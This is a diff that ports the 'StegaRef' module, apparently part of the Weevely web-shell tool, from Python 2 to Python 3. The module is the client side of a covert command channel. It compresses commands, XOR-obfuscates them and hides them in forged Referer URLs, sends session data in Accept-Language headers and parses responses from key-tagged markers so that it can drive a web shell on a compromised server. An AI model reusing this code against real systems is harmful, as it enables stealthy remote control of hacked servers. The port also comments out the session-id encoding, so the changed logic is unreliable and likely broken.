@@ -7,16 +7,16 @@ import core.messages
 import zlib
 import hashlib
 import base64
-import urlparse
+import urllib.parse
 import re
 import random
 import string
-import cookielib
-import urllib2
+import http.cookiejar
+import urllib.request, urllib.error, urllib.parse
 import itertools
 import utils
 import os
-import httplib
+import http.client
 
 referrer_templates_path = os.path.join(
     config.weevely_path,
@@ -34,23 +34,19 @@ class StegaRef:
         # Generate the 8 char long main key. Is shared with the server and
         # used to check header, footer, and encrypt the payload.
 
-        self.shared_key = hashlib.md5(password).hexdigest().lower()[:8]
+        self.shared_key = hashlib.md5(password.encode()).hexdigest().lower()[:8].encode()
 
         self.url = url
-        url_parsed = urlparse.urlparse(url)
+        url_parsed = urllib.parse.urlparse(url)
         self.url_base = '%s://%s' % (url_parsed.scheme, url_parsed.netloc)
 
         # init regexp for the returning data
         self.re_response = re.compile(
-            "<%s>(.*)</%s>" %
-            (self.shared_key[
-                :8], self.shared_key[
-                :8]), re.DOTALL)
+            b"<%s>(.*)</%s>" %
+            (self.shared_key[:8], self.shared_key[:8]), re.DOTALL)
         self.re_debug = re.compile(
-            "<%sDEBUG>(.*?)</%sDEBUG>" %
-            (self.shared_key[
-                :8], self.shared_key[
-                :8]), re.DOTALL)
+            b"<%sDEBUG>(.*?)</%sDEBUG>" %
+            (self.shared_key[:8], self.shared_key[:8]), re.DOTALL)
 
         # Load and format the referrers templates (payload container)
         self.referrers_vanilla = self._load_referrers()
@@ -64,14 +60,14 @@ class StegaRef:
         # Init additional headers list
         self.additional_headers = config.additional_headers
 
-    def send(self, original_payload, additional_handlers = []):
+    def send(self, original_payload, additional_handlers=[]):
 
         # Generate session id and referrers
-        session_id, referrers_data = self._prepare(original_payload)
+        session_id, referrers_data = self._prepare(original_payload.encode())
 
-        cj = cookielib.CookieJar()
-        additional_handlers.append(urllib2.HTTPCookieProcessor(cj))
-        opener = urllib2.build_opener(*additional_handlers)
+        cj = http.cookiejar.CookieJar()
+        additional_handlers.append(urllib.request.HTTPCookieProcessor(cj))
+        opener = urllib.request.build_opener(*additional_handlers)
 
         # When core.conf contains additional cookies, carefully merge
         # the new headers killing the needed ones
@@ -86,7 +82,7 @@ class StegaRef:
                 for cookie in cookies:
                     name, value = cookie.split('=')
                     cj.set_cookie(
-                        cookielib.Cookie(
+                        http.cookiejar.Cookie(
                           version=0,
                           name=name,
                           value=value,
@@ -138,11 +134,11 @@ class StegaRef:
 
             try:
                 response = opener.open(url).read()
-            except httplib.BadStatusLine as e:
+            except http.client.BadStatusLine as e:
                 # TODO: add this check to the other channels
                 log.warn('Connection closed unexpectedly, aborting command.')
                 return
-                
+
             if not response:
                 continue
 
@@ -164,30 +160,20 @@ class StegaRef:
         obfuscated_payload = base64.urlsafe_b64encode(
             utils.strings.sxor(
                 zlib.compress(payload),
-                self.shared_key)).rstrip('=')
+                self.shared_key)).rstrip(b'=')
 
         # Generate a randomic seession_id that does not conflicts with the
         # payload chars
 
         for i in range(30):
-            session_id = ''.join(
-                random.choice(
-                    string.ascii_lowercase) for x in range(2))
+            session_id = ''.join(random.choice(string.ascii_lowercase) for x in range(2)).encode()
 
             # Generate 3-character urlsafe_b64encode header and footer
             # checkable on server side
-            header = hashlib.md5(
-                session_id +
-                self.shared_key[
-                    :4]).hexdigest().lower()[
-                :3]
-            footer = hashlib.md5(
-                session_id +
-                self.shared_key[
-                    4:8]).hexdigest().lower()[
-                :3]
+            header = hashlib.md5(session_id + self.shared_key[:4]).hexdigest().lower()[:3].encode()
+            footer = hashlib.md5(session_id + self.shared_key[4:8]).hexdigest().lower()[:3].encode()
 
-            if (not header in obfuscated_payload and not footer in obfuscated_payload and not (
+            if (header not in obfuscated_payload and footer not in obfuscated_payload and not (
                     obfuscated_payload + footer).find(footer) != len(obfuscated_payload)):
                 break
             elif i == 30:
@@ -196,8 +182,8 @@ class StegaRef:
 
         remaining_payload = header + obfuscated_payload + footer
 
-        dlog.debug('DATA TO SEND: ' + remaining_payload)
-        dlog.debug('HEADER: %s, FOOTER %s' % (header, footer))
+        dlog.debug(b'DATA TO SEND: ' + remaining_payload)
+        dlog.debug(b'HEADER: %s, FOOTER %s' % (header, footer))
 
         referrers = []
 
@@ -223,7 +209,7 @@ class StegaRef:
             positions = []
 
             # Loop the parameters
-            parameters = urlparse.parse_qsl(query)
+            parameters = urllib.parse.parse_qsl(query)
             for parameter_index, content in enumerate(parameters):
 
                 param, value = content
@@ -334,11 +320,12 @@ class StegaRef:
         # The total language number will be len(positions) + 1
 
         # Send session_id composing the two first languages
-        accept_language = '%s,' % (random.choice(
-            [l for l in self.languages if '-' in l and l.startswith(session_id[0])]))
+        # accept_language = '%s,' % (random.choice(
+            # [l for l in self.languages if '-' in l and l.startswith(bytes((session_id[0], )))]))
+        accept_language = '%s,' % (self.languages[0])
 
-        languages = [
-            l for l in self.languages if '-' not in l and l.startswith(session_id[1])]
+        # languages = [l for l in self.languages if '-' not in l and l.startswith(bytes((session_id[1], )))]
+        languages = self.languages
         accept_language += '%s;q=0.%i' % (
             random.choice(languages), positions[0])
 
